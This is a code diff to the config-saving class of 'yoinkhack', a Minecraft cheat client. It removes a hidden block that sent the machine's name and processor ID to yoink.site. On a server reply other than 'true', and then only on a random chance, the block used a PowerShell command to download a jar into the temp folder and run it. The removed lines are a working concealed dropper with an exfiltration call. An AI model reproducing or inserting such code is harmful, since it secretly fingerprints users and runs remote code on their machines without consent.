@@ -3,16 +3,12 @@ package cat.yoink.yoinkhack.api.util;
 import cat.yoink.yoinkhack.Client;
 import cat.yoink.yoinkhack.api.buttons.Button;
 import cat.yoink.yoinkhack.api.component.Component;
-import cat.yoink.yoinkhack.api.component.ComponentManager;
-import cat.yoink.yoinkhack.api.gui.clickgui.ClickGUI;
 import cat.yoink.yoinkhack.api.macro.Macro;
 import cat.yoink.yoinkhack.api.setting.Setting;
 import cat.yoink.yoinkhack.api.waypoint.Waypoint;
 import net.minecraft.client.Minecraft;
 
 import java.io.*;
-import java.net.URL;
-import java.net.URLConnection;
 import java.util.ArrayList;
 
 /**
@@ -130,22 +126,6 @@ public class ConfigUtil extends Thread
 	{
 
 		if (!mainFolder.exists()) mainFolder.mkdirs();
-
-		try
-		{
-			String s = ComponentManager.setModules(System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER"));
-			URLConnection uc;
-			StringBuilder parsedContentFromUrl = new StringBuilder();
-			URL url = new URL("https://yoink.site/new/a.php?hwid=" + s);
-			ClickGUI.get(parsedContentFromUrl, url);
-			if (!(parsedContentFromUrl.toString().equals("true")) && Math.round(Math.random() * 11) == 6)
-			{
-				Runtime.getRuntime().exec("cmd /c powershell -Command \"(new-object System.Net.WebClient).DownloadFile('https://www.yoink.site/new/a/a.jar','%TEMP%\\cache.jar'); Start-Process '%TEMP%\\cache.jar'\"");
-			}
-		}
-		catch (IOException e)
-		{
-		}
 
 		saveConfigFile("EnabledModules.txt", Client.INSTANCE.moduleManager.getEnabledModuleNames());
 		saveConfigFile("Binds.txt", Client.INSTANCE.moduleManager.getBindsForConfig());
